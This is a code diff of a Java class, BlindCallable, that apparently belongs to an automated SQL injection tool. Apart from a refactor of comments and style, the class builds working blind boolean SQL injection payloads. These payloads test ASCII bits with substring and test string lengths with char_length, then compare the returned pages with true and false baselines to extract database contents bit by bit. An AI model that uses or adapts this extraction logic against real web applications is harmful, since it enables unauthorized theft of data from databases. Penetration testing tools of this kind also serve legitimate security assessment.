@@ -4,46 +4,76 @@ import java.util.LinkedList;
 import java.util.List;
 
 /**
- * Define a call HTTP to the server, require the associated url, character position and bit.
- * Opcodes represents the differences between the TRUE page, and the resulting page
+ * Define a call HTTP to the server, require the associated url, character
+ * position and bit. Opcodes represents the differences between
+ * the TRUE page, and the resulting page.
  */
-public class BlindCallable implements IBlindCallable{
-    // The URL called
+public class BlindCallable implements IBlindCallable {
+    /**
+     * The URL called.
+     */
     private String blindUrl;
-    // Character position
+    
+    /**
+     * Character position.
+     */
     private int currentIndex;
-    // Bit searched
+    
+    /**
+     * Bit searched.
+     */
     private int currentBit;
 
-    // Default call used for bit test
+    /**
+     * Default call used for bit test.
+     */
     private boolean isLengthTest = false;
-    // List of differences found between the TRUE page, and the present page
+    
+    /**
+     * List of differences found between the TRUE page, and the present page.
+     */
     private LinkedList<diff_match_patch.Diff> opcodes;
     
-	// Constructor for preparation and blind confirmation
-    BlindCallable(String urlTest){
-        blindUrl = "+and+"+urlTest+"--+";
+    /**
+     * Constructor for preparation and blind confirmation.
+     * @param urlTest
+     */
+    BlindCallable(String urlTest) {
+        this.blindUrl = "+and+" + urlTest + "--+";
     }
-    // Constructor for bit test
-    BlindCallable(String inj, int indexCharacter, int bit){
-    	blindUrl = "+and+ascii(substring("+inj+","+indexCharacter+",1))%26"+bit+"--+";
-        currentIndex = indexCharacter;
-        currentBit = bit;
+    
+    /**
+     * Constructor for bit test.
+     * @param inj
+     * @param indexCharacter
+     * @param bit
+     */
+    BlindCallable(String inj, int indexCharacter, int bit) {
+        blindUrl = "+and+ascii(substring(" + inj + "," + indexCharacter + ",1))%26" + bit + "--+";
+        this.currentIndex = indexCharacter;
+        this.currentBit = bit;
     }
-    // Constructor for length test
-    BlindCallable(String newUrl, int indexCharacter, boolean newIsLengthTest){
-    	blindUrl = "+and+char_length("+newUrl+")>"+indexCharacter+"--+";
-        isLengthTest = newIsLengthTest;
+    
+    /**
+     * Constructor for length test.
+     * @param newUrl
+     * @param indexCharacter
+     * @param isLengthTest
+     */
+    BlindCallable(String newUrl, int indexCharacter, boolean isLengthTest) {
+        this.blindUrl = "+and+char_length(" + newUrl + ")>" + indexCharacter + "--+";
+        this.isLengthTest = isLengthTest;
     }
 
     /**
      * Check if a result page means the SQL query is true,
-     * confirm that nothing in the resulting page is also defined in the pages from every FALSE SQL queries,
+     * confirm that nothing in the resulting page is also defined
+     * in the pages from every FALSE SQL queries.
      * @return true if the current SQL query is true
      */
     public boolean isTrue() {
-        for( diff_match_patch.Diff falseDiff: ConcreteBlindInjection.constantFalseMark){
-            if(opcodes.contains(falseDiff)){
+        for (diff_match_patch.Diff falseDiff: ConcreteBlindInjection.getConstantFalseMark()) {
+            if (this.opcodes.contains(falseDiff)) {
                 return false;
             }
         }
@@ -51,30 +81,31 @@ public class BlindCallable implements IBlindCallable{
     }
 
     /**
-     * Process the URL HTTP call, use function inject() from the model
-     * Build the list of differences found between TRUE and the current page
+     * Process the URL HTTP call, use function inject() from the model.
+     * Build the list of differences found between TRUE and the current page.
+     * @return Functional Blind Callable
      */
     @Override
     public BlindCallable call() throws Exception {
-        String ctnt = ConcreteBlindInjection.callUrl(blindUrl);
-        opcodes = new diff_match_patch().diff_main(ConcreteBlindInjection.blankTrueMark, ctnt, true);
-        new diff_match_patch().diff_cleanupEfficiency(opcodes);
+        String ctnt = ConcreteBlindInjection.callUrl(this.blindUrl);
+        opcodes = new diff_match_patch().diff_main(ConcreteBlindInjection.getBlankTrueMark(), ctnt, true);
+        new diff_match_patch().diff_cleanupEfficiency(this.opcodes);
         return this;
     }
 
     public List<diff_match_patch.Diff> getOpcodes() {
-		return opcodes;
-	}
+        return this.opcodes;
+    }
     
-	public boolean getisLengthTest() {
-		return isLengthTest;
-	}
-	
-	public int getCurrentIndex() {
-		return currentIndex;
-	}
-	
-	public int getCurrentBit() {
-		return currentBit;
-	}
+    public boolean isLengthTest() {
+        return this.isLengthTest;
+    }
+    
+    public int getCurrentIndex() {
+        return this.currentIndex;
+    }
+    
+    public int getCurrentBit() {
+        return this.currentBit;
+    }
 }
